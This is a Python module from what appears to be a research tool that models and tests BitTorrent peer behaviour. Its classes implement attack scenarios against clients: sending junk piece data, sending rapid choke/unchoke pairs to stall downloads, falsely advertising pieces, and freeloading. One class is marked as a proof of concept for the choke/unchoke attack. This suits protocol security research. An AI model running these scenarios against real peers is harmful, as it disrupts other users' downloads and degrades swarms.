'''
File:        attacks.py
Author:      rjwalls
Description: This module contains predefined attack scenarios. It is used
    primarily for testing different attack scenarios. Each of this attacks
    can be run from the command line using -e "ClassName"

'''

from .fsm import utilities
from explorebase import ExperimentBase, EventExecute, EventExecuteExplore
import time
from twisted.internet import defer, reactor

import random
import struct
from ..tools import sleep
from ..BTProtocol import BTServerProtocol, BTClientProtocol
from ..bitfield import Bitfield


class ns_choke_careful_dos(BTClientProtocol):
    '''
    Unchoke when we get all of the pieces.
    respond to requests with bad pieces,
    send choke/unchoke if the request is the first chunk of a piece
    '''
    def nothing(self):
        pass

    @defer.inlineCallbacks
    def send_unchoke(self):
        #print 'Info: waiting to send unchoke'

        if not hasattr(self, 'mutex'):
            self.mutex = True
        elif self.mutex:
            return

        #self.choking is set when we've given the target a set number
        #of pieces
        if hasattr(self, 'choking') and self.choking:
            return

        while True:
            if self.btm.pieceManager.bitfield.allOne():
                #log.msg('{0}, Info: Received all pieces.'\
                #        'Now unchoking'.format(self.peer_id_str))

                self.mutex = False
                BTClientProtocol.send_unchoke(self)
                break
            yield sleep(1)


    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        log.msg('{3}, Info: Request Index {0}, Begin {1}, Length {2}'.format(
            index, begin, length, self.peer_id_str))
        self.send_piece(index, begin, 'a'*length)

    def send_piece(self, index, begin, piece):
        if not hasattr(self, "preqs"):
            self.preqs = {}
            self.choking = False

        if self.choking:
            return

        piececount = 8
        chunkcount = 4


        #Only send the very last
        if begin < 49152:
            self.send_choke()
            self.send_unchoke()
        #if index in self.preqs and len(self.preqs[index]) >= chunkcount:
        #    self.send_choke()
        #    self.send_unchoke()
        # Send bad data and record their request
        else:
            log.msg('{0}, -bad_piece'.format(self.peer_id_str))
            log.msg('{0} Info: piece index {1},' \
                    'begin {2}, length {3}'.format(self.peer_id_str,
                                                   index,
                                                   begin,
                                                   len(piece)))


            if index not in self.preqs:
                self.preqs[index] = []

            self.preqs[index].append(begin)

            #Always send bad data for a piece
            #pieces are of type string.
            bad_piece = 'a' * len(piece)

            data = struct.pack('!II', index, begin) + bad_piece
            self.send_message(self.msg_piece, data)



class ns_choke_careful(BTClientProtocol):
    '''
    respond to requests with bad pieces,
    send choke/unchoke if the request is the first chunk of a piece
    '''
    def nothing(self):
        pass

    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        log.msg('{3}, Info: Request Index {0}, Begin {1}, Length {2}'.format(
            index, begin, length, self.peer_id_str))
        self.send_piece(index, begin, 'a'*length)

    @defer.inlineCallbacks
    def send_piece(self, index, begin, piece):
        if not hasattr(self, "preqs"):
            self.preqs = []
            self.choking = False

        if self.choking:
            return

        # Some targets won't accept pieces from you if you have
        # choked them
        # For now lets hard code the begin/chunk-start values that
        # we will ignore. This will allow us to only send 1/2, 1/3, etc.
        # for a given piece.
        # if the piece is 65536 bytes, then setting this value to 32768
        # means we won't sent the second half.
        # It might matter if you send the first versus last part of a piece
        if begin >= 16384:
            self.send_choke()
            self.send_unchoke()
        elif False and (index, begin) in self.preqs:
            self.send_choke()
            self.choking = True
            yield sleep(1)
            self.send_unchoke()
        # Send bad data for everything but the first part of a piece
        else:
            log.msg('{0}, -bad_piece'.format(self.peer_id_str))

            self.preqs.append((index, begin))
            #Always send bad data for a piece
            #pieces are of type string.
            bad_piece = 'a' * len(piece)

            data = struct.pack('!II', index, begin) + bad_piece
            self.send_message(self.msg_piece, data)


class ns_noseedstest_svr(BTServerProtocol):
    def handle_bitfield(self, data):
        bf = Bitfield(self.download.pieceManager.pieces_size, data)

        if bf.allOne():
            self.peerisseed = True
            print '{0}, Info: Peer is seed (from bitfield)...disconnecting'.format(str(self.peer_id_str))
            self.transport.loseConnection()
            return
        else:

            print '{0}, Info: Peer is not a seed.'.format(str(self.peer_id_str))

        self.download._bitfield(data)

    def handle_have(self, data):
        BTServerProtocol.handle_have(self, data)

        if self.download.peer_bitfield.allOne():
            self.peerisseed = True
            print '{0}, Info: Peer is now seed (from have messages)...disconnecting'.format(str(self.peer_id_str))
            self.transport.loseConnection()

class ns_noseedstest(BTClientProtocol):
    def handle_bitfield(self, data):
        bf = Bitfield(self.download.pieceManager.pieces_size, data)

        if bf.allOne():
            log.msg('{0}, Info: rbitfield is all one'.format(self.peer_id_str))
        elif bf.allZero():
            log.msg('{0}, Info: rbitfield is all zero'.format(self.peer_id_str))
        else:
            log.msg('{0}, Info: rbitfield is mixed'.format(self.peer_id_str))

        if bf.allOne():
            self.peerisseed = True
            print '{0}, Info: Peer is seed (from bitfield)...disconnecting'.format(str(self.peer_id_str))
            self.transport.loseConnection()
            return
        else:
            print '{0}, Info: Peer is not a seed.'.format(str(self.peer_id_str))

        self.download._bitfield(data)

    def handle_have(self, data):
        BTClientProtocol.handle_have(self, data)

        if self.download.peer_bitfield.allOne():
            self.peerisseed = True
            print '{0}, Info: Peer is now seed (from have messages)...disconnecting'.format(str(self.peer_id_str))
            self.transport.loseConnection()

class nsl_aggressive_base_svr(ns_noseedstest_svr):
    '''
    After handling the bitfield, send a bunch of have messages to pretend we
    have the opposite set of pieces from the target

    EDIT: Let's send at most 20.
    '''
    def handle_unchoke(self, data):
        ns_noseedstest_svr.handle_unchoke(self, data)

        tester_bf = self.btm.pieceManager.bitfield
        target_bf = self.download.peer_bitfield

        count = 0

        for x in xrange(self.btm.metainfo.pieces_size):
            # We want both to be true, because we do not want
            # to send a have message for a piece that we already advertised
            # in the previously sent bitfield.
            if target_bf[x] == 0 and tester_bf[x] == 0:
                self.send_have(x)
                count = count + 1

            if count >= 20:
                break

class nsl_aggressive_base(ns_noseedstest):
    '''
    After handling the bitfield, send a bunch of have messages to pretend we
    have the opposite set of pieces from the target

    '''
    def handle_bitfield(self, data):
        ns_noseedstest.handle_bitfield(self, data)

    def handle_unchoke(self, data):
        ns_noseedstest.handle_unchoke(self,data)

        tester_bf = self.btm.pieceManager.bitfield
        target_bf = self.download.peer_bitfield

        count = 0

        for x in xrange(self.btm.metainfo.pieces_size):
            # We want both to be true, because we do not want
            # to send a have message for a piece that we already advertised
            # in the previously sent bitfield.
            if target_bf[x] == 0 and tester_bf[x] == 0:
                self.send_have(x)
                count = count + 1

            if count >= 20:
                break






class ns_aggressive_base(ns_noseedstest):
    '''
    After handling the bitfield, send a bunch of have messages to pretend we
    have the opposite set of pieces from the target

    '''
    def handle_bitfield(self, data):
        ns_noseedstest.handle_bitfield(self, data)

        tester_bf = self.btm.pieceManager.bitfield
        target_bf = self.downlaod.peer_bitfield

        for x in xrange(self.btm.metainfo.pieces_size):
            # We want both to be true, because we do not want
            # to send a have message for a piece that we already advertised
            # in the previously sent bitfield.
            if target_bf[x] == 0 and tester_bf[x] == 0:
                self.send_have(x)


class nsl_download_svr(ns_noseedstest_svr):
    '''
    operate normally to download the file, but always pretend to have zero
    piece of a file, and respond with choke/unchoke to requests.
    '''
    def finishHandshake(self):
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 0

        self.btm.pieceManager.bitfield = bitfield

        ns_noseedstest_svr.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()

    def send_have(self, index):
        '''
        We never want to advertise that we have downloaded any pieces, just so
        we don't get any requests

        '''
        pass



class nsl_download(ns_noseedstest):
    '''
    operate normally to download the file, but always pretend to have zero
    piece of a file, and respond with choke/unchoke to requests.
    '''
    def finishHandshake(self):
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 0

        self.btm.pieceManager.bitfield = bitfield

        ns_noseedstest.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()

    def send_have(self, index):
        '''
        We never want to advertise that we have downloaded any pieces, just so
        we don't get any requests

        '''
        pass

class nsl_ignore_and_download(nsl_aggressive_base):
    '''
    operate normally to download the file, but ignore all requests
    Pretend to have all of the opposite pieces of the target
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)


class nsl_ignore_and_download_svr(nsl_aggressive_base_svr):
    '''
    operate normally to download the file, but ignore all requests
    Pretend to have all of the opposite pieces of the target
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)

class nsl_choke_and_download_sleepless(nsl_aggressive_base):
    '''
    operate normally to download the file, but respond to all requests
    with choke/unchoke
    Pretend to have all of the opposite pieces of the target
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()

class nsl_choke_and_download_sleepless_svr(nsl_aggressive_base_svr):
    '''
    operate normally to download the file, but respond to all requests
    with choke/unchoke
    Pretend to have all of the opposite pieces of the target
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()



class nsl_choke_and_download(nsl_aggressive_base):
    '''
    operate normally to download the file, but respond to all requests
    with choke/unchoke
    Pretend to have all of the opposite pieces of the target
    '''

    @defer.inlineCallbacks
    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        yield sleep(1)
        self.send_unchoke()

class nsl_choke_and_download_svr(nsl_aggressive_base_svr):
    '''
    operate normally to download the file, but respond to all requests
    with choke/unchoke
    Pretend to have all of the opposite pieces of the target
    '''

    @defer.inlineCallbacks
    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        yield sleep(1)
        self.send_unchoke()


class ns_initial(BTClientProtocol):
    '''
    Use this class to create the initial target model.

    '''
    def nothing():
        pass

class nsl_test(BTClientProtocol):
    def nothing():
        pass

class nsl_test_svr(BTServerProtocol):
    def nothing():
        pass

class ns_half_upload(BTClientProtocol):
    '''
    Only upload the first half of the file
    '''
    def __init__(self):
        self.request_bitfield = None
        self.request_bytesbypiece = None
        BTClientProtocol.__init__(self)

    def finishHandshake(self):
        '''
        Autonomo has a bug where it doesn't always build the Bitfield correctly
        '''
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        # Use the request bitfield to keep track of what pieces
        # have been requested.
        self.request_bitfield = Bitfield(self.btm.metainfo.pieces_size)
        self.request_bytesbypiece = [0] * self.btm.metainfo.pieces_size

        halfway = self.btm.metainfo.pieces_size / 2

        for x in xrange(self.btm.metainfo.pieces_size):
            if x < halfway:
                bitfield[x] = 1
                self.request_bitfield[x] = 0
            else :
                bitfield[x] = 0
                self.request_bitfield[x] = 1

        self.btm.pieceManager.bitfield = bitfield

        BTClientProtocol.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        log.msg('{3}, Info: Request Index {0}, Begin {1}, Length {2}'.format(
            index, begin, length, self.peer_id_str))
        self.upload._request(index, begin, length)

        self.request_bytesbypiece[index] += length

        if self.request_bytesbypiece[index] >= self.btm.metainfo.piece_length:
            self.request_bitfield[index] = 1

        if self.request_bitfield.allOne():
            log.msg('{0}, Info: target has been sent all available pieces'.format(self.peer_id_str))
            self.exit()

    @defer.inlineCallbacks
    def exit(self):
        # Give the tester a second to send the last piece
        yield sleep(1)
        reactor.callFromThread(reactor.stop)

class ns_normalupload(ns_noseedstest):
    '''
    act as a normal seed. This is useful for obtaining the initial model
    of a target
    '''
    def finishHandshake(self):
        '''
        Autonomo has a bug where it doesn't always build the Bitfield correctly
        '''
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 1

        self.btm.pieceManager.bitfield = bitfield

        ns_noseedstest.finishHandshake(self)

class ns_normaldownload(ns_noseedstest):
    '''
    operate normally to download the file
    '''
    def finishHandshake(self):
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 0

        self.btm.pieceManager.bitfield = bitfield

        ns_noseedstest.finishHandshake(self)


class ns_download(ns_noseedstest):
    '''
    operate normally to download the file, but always pretend to have zero
    piece of a file, and respond with choke/unchoke to requests.
    '''
    def finishHandshake(self):
        self.btm = self.factory.btm

        # Set the bitfield to be all 0s, i.e. pretend
        # we don't have any pieces of the file even if we do
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 0

        self.btm.pieceManager.bitfield = bitfield

        ns_noseedstest.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()

    def send_have(self, index):
        '''
        We never want to advertise that we have downloaded any pieces, just so
        we don't get any requests

        '''
        pass

class ns_ignore_and_download(ns_noseedstest):
    '''
    operate normally to download the file, but ignore all requests
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)


class ns_choke_and_download(ns_noseedstest):
    '''
    operate normally to download the file, but respond to all requests
    with choke/unchoke
    '''

    def handle_request(self, data):
        index, begin, length = struct.unpack('!iii', data)
        print 'info: index {0}, begin {1}, length {2}'.format(index,
                begin, length)
        self.send_choke()
        self.send_unchoke()

class ns_targeted_choke_careful_er(BTClientProtocol):
    def nothing(self):
        pass

    def finishHandshake(self):
        # A list of previous requests
        self.preqs = []

        self.btm = self.factory.btm

        # Set the bitfield to be all 1s, i.e. pretend
        # we have the entire file even if we don't
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 1

        self.btm.pieceManager.bitfield = bitfield

        BTClientProtocol.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        print 'Info: Index {0}, Begin {1}, Length {2}'.format(index,
                begin, length)
        self.send_piece(index, begin, 'a'*length)

    def send_piece(self, index, begin, piece):
        #only send data once per piece
        if begin != 0 and index not in self.preqs:
            log.msg('{0}, -bad_piece'.format(self.peer_id_str))

            self.preqs.append(index)
            #Always send bad data for a piece
            #pieces are of type string.
            bad_piece = 'a' * len(piece)

            data = struct.pack('!II', index, begin) + bad_piece
            self.send_message(self.msg_piece, data)
        else:
            self.send_choke()
            self.send_unchoke()

class ns_targeted_choke_more(BTClientProtocol):
    def nothing(self):
        pass

    def finishHandshake(self):
        self.btm = self.factory.btm

        # Set the bitfield to be all 1s, i.e. pretend
        # we have the entire file even if we don't
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 1

        self.btm.pieceManager.bitfield = bitfield

        BTClientProtocol.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        print 'Info: Index {0}, Begin {1}, Length {2}'.format(index,
                begin, length)
        self.send_piece(index, begin, 'a'*length)

    def send_piece(self, index, begin, piece):
        # Send bad data for everything but the first part of a piece
        if begin != 0:
            log.msg('{0}, -bad_piece'.format(self.peer_id_str))

            #Always send bad data for a piece
            #pieces are of type string.
            bad_piece = 'a' * len(piece)

            data = struct.pack('!II', index, begin) + bad_piece
            self.send_message(self.msg_piece, data)
        else:
            self.send_choke()
            self.send_unchoke()

class ns_targeted_Slow_Uploader(BTClientProtocol):
    '''
    Upload the piece to those that need it, just be slow.
    '''

    def send_piece(self, index, begin, piece):
        time.sleep(1)
        BTClientProtocol.send_piece(self, index, begin, piece)


class ns_Slow_Uploader(BTClientProtocol):
    '''
    Upload the piece to those that need it, just be slow.
    '''

    def send_piece(self, index, begin, piece):
        time.sleep(1)
        BTClientProtocol.send_piece(self, index, begin, piece)

class Dos_Test(BTClientProtocol):
    '''
    Respond normally to everything but piece requests.
    Send junk for the first part of a piece, and choke/unchoke for
    everything else.

    Also trying to use the BTClientProtocol so that I can initial handshakes.
    '''

    def send_piece(self, index, begin, piece):
        if begin == 0:
            log.msg('{0}, -bad_piece'.format(self.peer_id_str))

            #Always send bad data for a piece
            #pieces are of type string.
            bad_piece = 'a' * len(piece)

            data = struct.pack('!II', index, begin) + bad_piece
            self.send_message(self.msg_piece, data)
        else:
            self.send_choke()
            self.send_unchoke()

class ns_targeted_choke(Dos_Test):
    def nothing(self):
        pass

    def finishHandshake(self):
        self.btm = self.factory.btm
        bitfield = Bitfield(self.btm.metainfo.pieces_size)

        for x in xrange(self.btm.metainfo.pieces_size):
            bitfield[x] = 1

        self.btm.pieceManager.bitfield = bitfield

        Dos_Test.finishHandshake(self)

    def handle_request(self, data):
        index, begin, length = struct.unpack('!III', data)
        print 'Info: Index {0}, Begin {1}, Length {2}'.format(index,
                begin, length)
        self.send_piece(index, begin, 'a'*length)

class Test_Loops(EventExecute):
    '''
    Given a suspected loop, let's try to execute the loop.

    '''

    def __init__(self):
        EventExecute.__init__(self)

    def finishHandshake(self):
        #dot = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
        #    'experiments/loop_search/stage_100_0_request.dot'
        dot = self.factory.btm.model_path

        if dot is None or dot == '':
            raise Exception("Model path is empty or None")
        model = utilities.dot_to_fsm(dot)

        self._loop = self.factory.btm.loop

        if self._loop is None or self._loop == []:
            raise Exception("Input loop is empty or None")

        #self._loop = ['+request', '-choke', '-unchoke', '+request']
        #self._loop = ['+interested', '-choke', '-unchoke', '+interested']
        #self._loop = ['+handshake', '-choke', '+handshake']
        self._loopindex = -1
        self._loopiterations = 0

        print 'Info: Looking for loop:', self._loop

        #This should be the start of the loop
        dest_event =  self._loop[0]

        self._inloop = False
        self._dest_event_models[dest_event] = model

        EventExecute.finishHandshake(self)

    def _get_response(self, current_event):
        if isinstance(current_event, list):
            responses = []
            for e in current_event:
                responses += self._get_response(e)
            return responses

        #Check if event is the start of the loop
        if self._loopindex < 0 and current_event == self._loop[0]:
            print 'Info: Entered start of suspected loop.'
            self._loopindex = 0

        #Check if we are in the loop
        if self._loopindex >= 0:
            #Check if the event matches what we expected to see
            if self._loop[self._loopindex] != current_event:
                print 'Info: Unexpected event, wanted {0}, '\
                    'received {1}'.format(self._loop[self._loopindex],
                                          current_event)

            #Check if this the last event in the loop
            if self._loopindex == len(self._loop) - 1:
                self._loopiterations += 1
                print 'Info: loop iteration {0}'.format(self._loopiterations)
                self._loopindex = -1
                return self._get_response(current_event)

            send_events = []

            for idx in xrange(self._loopindex + 1, len(self._loop) - 1):
                if not self._loop[idx].startswith("+"):
                    send_events.append(self._loop[idx])
                    self._loopindex = idx + 1
                else:
                    break

            return send_events
        else:
            return EventExecute._get_response(self, current_event)


class ns_Play_Nice(EventExecuteExplore):
    '''
    Tries to follow the input model exactly.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)
        #self.USE_RAND_RESPOSES = True
        #self.EXPLORE_AFTER_GOAL = True

    def finishHandshake(self):
        #dot_model = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
        #    'experiments/model_refinement/working.dot'
        #dot_model = '/experiments/model_refinement/working.dot'

        dot_model = self.factory.btm.model_path

        if dot_model is None or dot_model == '':
            raise Exception("Model path is empty or None")

        log.msg('Info: Using model {0}'.format(dot_model))

        model = utilities.dot_to_fsm(dot_model)

        # Pick a random event from the model and set that as the destination
        dest_event = utilities.get_random_event(model)
        #RJW: Temporarily fix the destination event
        dest_event = '+have'

        # if there are not event to pick it will return none
        if dest_event is not None:
            log.msg('Info: Destination {0}'.format(dest_event))

            self._dest_event_models[dest_event] = model
            self._remaining_goals = self._dest_event_models.keys()


        EventExecuteExplore.finishHandshake(self)


class ns_Explore_And_Refine(EventExecuteExplore):
    '''
    Let's iterate and explore the model.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)
        self.USE_RAND_RESPONSES = True
        self.EXPLORE_AFTER_GOAL = True
        self.SKIP_RESPONSES = True

    def finishHandshake(self):
        #dot_model = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
        #    'experiments/model_refinement/working.dot'
        #dot_model = '/experiments/model_refinement/working.dot'

        dot_model = self.factory.btm.model_path

        if dot_model is None or dot_model == '':
            raise Exception("Model path is empty or None")

        log.msg('Info: Using model {0}'.format(dot_model))

        model = utilities.dot_to_fsm(dot_model)

        # Pick a random event from the model and set that as the destination
        dest_event = utilities.get_random_event(model)

        # if there are not event to pick it will return none
        if dest_event is not None:
            log.msg('Info: Destination {0}'.format(dest_event))

            self._dest_event_models[dest_event] = model
            self._remaining_goals = self._dest_event_models.keys()


        EventExecuteExplore.finishHandshake(self)

class Shrink_AtkChoke(EventExecuteExplore):
    '''
    Tries to find a path to the piece event while randomly ignoring some
    send-type events (-events). The idea is to generate a bunch of new traces
    and find which messages are and are not necessary for making the event
    happen.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)

        dot_atkchoke = '/Users/wallsr/Documents/Research/ProtocolRevEng/'\
            'git/experiments/event_search/atkchoke.dot'
        model_atkchoke = utilities.dot_to_fsm(dot_atkchoke)
        self._dest_event_models['attack_choke'] = model_atkchoke

    def _send_bitfield_partial(self):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero for the second piece
        self.bitfield.set0(0)
        self.bitfield.set1(1)

        self._send_bitfield()

    def _send_attack_choke(self):
        '''
        This is the method associated with the attack_choke event.
        It will execute the choke/unchoke attack.

        '''
        log.msg('{0}, event:attack_choke'.format(self.peer_id_str))

        self._send_choke()
        self._send_unchoke()
        return


class Shrink_Piece_Moar(EventExecuteExplore):
    '''
    Same as the Shrink_Piece scenario, but it starts with the previously
    reduced model.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)

        dot_piece = '/Users/wallsr/Documents/Research/ProtocolRevEng/'\
            'git/experiments/shrink_models/synoptic/'\
            'shrink_rpiece_more_reduced.dot'
        model_piece = utilities.dot_to_fsm(dot_piece)
        self._dest_event_models['+piece'] = model_piece

    def _send_bitfield_partial(self):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero for the second piece
        self.bitfield.set0(0)
        self.bitfield.set1(1)

        self._send_bitfield()


class Shrink_Piece_WithRandom(EventExecuteExplore):
    '''
    Tries to find a path to the piece event while randomly ignoring some
    send-type events (-events) and sometimes sending random responses.  The
    idea is to generate a bunch of new traces and find which messages are and
    are not necessary for making the event happen.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)

        dot_piece = '/Users/wallsr/Documents/Research/ProtocolRevEng/'\
            'git/experiments/event_search/autonomo_basic.dot'
        model_piece = utilities.dot_to_fsm(dot_piece)
        self._dest_event_models['+piece'] = model_piece
        self.USE_RAND_RESPONSES = True

    def _send_bitfield_partial(self):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero for the second piece
        self.bitfield.set0(0)
        self.bitfield.set1(1)

        self._send_bitfield()


class Shrink_Piece(EventExecuteExplore):
    '''
    Tries to find a path to the piece event while randomly ignoring some
    send-type events (-events). The idea is to generate a bunch of new traces
    and find which messages are and are not necessary for making the event
    happen.

    '''

    def __init__(self):
        EventExecuteExplore.__init__(self)

        dot_piece = '/Users/wallsr/Documents/Research/ProtocolRevEng/'\
            'git/experiments/event_search/autonomo_basic.dot'
        model_piece = utilities.dot_to_fsm(dot_piece)
        self._dest_event_models['+piece'] = model_piece

    def _send_bitfield_partial(self):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero for the second piece
        self.bitfield.set0(0)
        self.bitfield.set1(1)

        self._send_bitfield()


class AtkFindPathManyEvents(EventExecute):
    '''
    This scenario tries to find the path need to execute two different
    user defined events: +piece and attack_choke.

    '''

    def __init__(self):
        EventExecute.__init__(self)

        dot_piece = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
            'experiments/event_search/autonomo_basic.dot'
        dot_atkchoke = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
            'experiments/event_search/atkchoke.dot'

        model_piece = utilities.dot_to_fsm(dot_piece)
        model_atkchoke = utilities.dot_to_fsm(dot_atkchoke)

        # Need to associate a model with each target event.
        # That model should contain the event.
        self._dest_event_models['+piece'] = model_piece
        self._dest_event_models['attack_choke'] = model_atkchoke

    def handle_piece(self, data):
        EventExecute.handle_piece(self, data)

    def _send_bitfield_partial(self):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero for the second piece
        self.bitfield.set0(0)
        self.bitfield.set1(1)

        self._send_bitfield()

    def _send_not_interested(self):
        '''
        For now we are ignoring this message type since it causes a conflict
        with our  destination events.

        '''
        pass

    def _send_attack_choke(self):
        '''
        This is the method associated with the attack_choke event.
        It will execute the choke/unchoke attack.

        '''
        log.msg('{0}, event:attack_choke'.format(self.peer_id_str))

        self._send_choke()
        self._send_unchoke()
        return


class AtkFindReqPath(EventExecute):
    '''
    This scenario tries to find the sequence of messages needed to make the
    +piece event happen.

    '''

    def __init__(self):
        EventExecute.__init__(self)

        dot_event = '/Users/wallsr/Documents/Research/ProtocolRevEng/git/'\
            'experiments/autonomo_basic/autonomo_basic.dot'
        model_event = utilities.dot_to_fsm(dot_event)

        self._dest_event_models['+piece'] = model_event


class AtkTwoMess(ExperimentBase):
    '''
    Sends a pair of messages in response to a request. The initial choice is
    random, but it once chosen it uses the same message pair for every request.
    We want this to find the choke/unchoke attack.

    '''

    def __init__(self):
        AtkExperimentBase.__init__(self)
        self._idx0 = None
        self._idx1 = None

    def send_piece(self, index, begin, piece):
        log.msg('{0}, event:attack_twomessages'.format(self.peer_id_str))

        rand_mess = [(self.send_cancel, [index, begin, len(piece)]),
                     (self.send_port, [self.btm.app.listen_port]),
                     (self.send_request, [index, begin, len(piece)]),
                     (self.send_bitfield, [self.btm.pieceManager.bitfield]),
                     (self.send_have, [index]),
                     (self.send_not_interested, []),
                     (self.send_interested, []),
                     (self.send_unchoke, []),
                     (self.send_choke, []),
                     (self.send_keep_alive, [])]

        #Always send the same pair
        if self._idx0 is None:
            self._idx0 = random.randint(0, len(rand_mess) - 1)
            self._idx1 = random.randint(0, len(rand_mess) - 1)

        mess0, args0 = rand_mess[self._idx0]
        mess1, args1 = rand_mess[self._idx1]

        mess0(*args0)
        mess1(*args1)


class AtkUnex(ExperimentBase):
    '''
    Note: This class has been superseded by the EventExecuteExplore class.
    Responds to piece requests with a random and unexpected message type.

    '''

    def __init__(self):
        ExperimentBase.__init__(self)

    def send_piece(self, index, begin, piece):

        log.msg('{0}, event:unexpected_response'.format(self.peer_id_str))

        rand_mess = [(self.send_cancel, [index, begin, len(piece)]),
                     (self.send_port, [self.btm.app.listen_port]),
                     (self.send_request, [index, begin, len(piece)]),
                     (self.send_bitfield, [self.btm.pieceManager.bitfield]),
                     (self.send_have, [index]),
                     (self.send_not_interested, []),
                     (self.send_interested, []),
                     (self.send_unchoke, []),
                     (self.send_choke, []),
                     (self.send_choke, []),
                     (self.send_keep_alive, [])]

        idx = random.randint(0, len(rand_mess) - 1)

        func, args = rand_mess[idx]

        func(*args)


class AtkRand(ExperimentBase):
    '''
    Replaces the actual piece data with a long string of a's.

    '''
    def __init__(self):
        ExperimentBaseBase.__init__(self)

    def send_piece(self, index, begin, piece):
        log.msg('{0}, -bad_piece'.format(self.peer_id_str))

        #Always send bad data for a piece
        #pieces are of type string.
        bad_piece = 'a' * len(piece)

        data = struct.pack('!II', index, begin) + bad_piece
        self.send_message(self.msg_piece, data)


class AtkChoke(ExperimentBase):
    '''
    Sends a quick choke/unchoke pair for any message request that isnt the
    start of piece. For requests for the start of a piece (i.e. begin == 0)
    it will send a bad_piece comprised of all 'a's.

    '''
    def __init__(self):
        ExperimentBase.__init__(self)

    def send_piece(self, index, begin, piece):
        if begin > 0:
            log.msg('{0}, event:ignore_piece'.format(self.peer_id_str))
            self.send_choke()
            self.send_unchoke()
            return

        log.msg('{0}, -bad_piece'.format(self.peer_id_str))

        #Always send bad data for a piece
        #pieces are of type string.
        bad_piece = 'a' * len(piece)

        data = struct.pack('!II', index, begin) + bad_piece
        self.send_message(self.msg_piece, data)


class AtkChokeAndDownload(ExperimentBase):
    '''
    Proof of concept. Executes the choke/unchoke attack while attempting to
    download a piece from the target.

    Lots of hard-coded values that need to be fixed to make the attack work
    in general. The target might also need to have the piece we are requesting.

    '''
    def __init__(self):
        ExperimentBase.__init__(self)
        self._requestcount = 0
        self._requested = False

    def handle_bitfield(self, data):
        # We have to tell them we are interested or they won't
        # unchoke us.
        self.send_interested()
        AtkChoke.handle_bitfield(self, data)

    def handle_unchoke(self, data):
        # Once they unchoke us then we will advertise that
        # we have a piece they want.
        self.send_have(0)
        AtkChoke.handle_unchoke(self, data)

    def send_not_interested(self):
